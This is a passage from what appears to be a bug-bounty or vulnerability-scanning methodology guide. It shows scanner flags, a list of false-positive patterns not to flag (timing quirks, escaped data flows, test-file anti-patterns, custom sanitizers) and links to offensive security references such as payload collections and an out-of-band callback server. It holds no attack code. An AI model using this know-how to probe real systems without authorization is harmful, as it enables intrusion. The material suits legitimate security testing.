| `--payload-evolution` | Adaptive payload learning |
| `--emergent-behavior` | Feature interaction analysis |
| `--hidden-capability` | Undocumented functionality prediction |


---

## S-Class Safe Patterns (Do Not Flag — Additions)

**Behavioral anomalies:** Timing differences caused by CDN caching, rate limiting responses with consistent timing, expected 404s on non-existent resources.

**Second-order flows:** Data stored and later rendered with proper escaping in ALL consumption paths.

**Patch-gap analysis:** Code that contains the anti-pattern but is in a test file, mock, or intentionally vulnerable training environment.

**Economic fuzzing:** Negative simulated profit on all iterations with no viable attack path.

**Semantic taint:** Source reaches sink but passes through a custom sanitizer not in the default SANITIZERS list (verify sanitizer logic manually before dismissing).


## RESOURCES

- [HackerOne Hacktivity](https://hackerone.com/hacktivity) — Disclosed reports
- [HackerOne Top 100 Upvoted](https://reddelexc.github.io/hackerone-reports/#tops_100/TOP100UPVOTED.md) — Highest upvoted reports by bug class and program
- [HackerOne Top 100 Paid](https://reddelexc.github.io/hackerone-reports/#tops_100/TOP100PAID.md) — Highest paying reports
- [PortSwigger Web Academy](https://portswigger.net/web-security) — Free vuln labs
- [HackTricks](https://book.hacktricks.xyz) — Attack technique reference
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Payload reference
- [SecLists](https://github.com/danielmiessler/SecLists) — Comprehensive wordlists
- [Solodit](https://solodit.cyfrin.io) — 50K+ searchable audit findings (Web3)
- [sisakulint](https://sisaku-security.github.io/lint/) — GitHub Actions SAST
- [interactsh](https://app.interactsh.com) — OOB callback server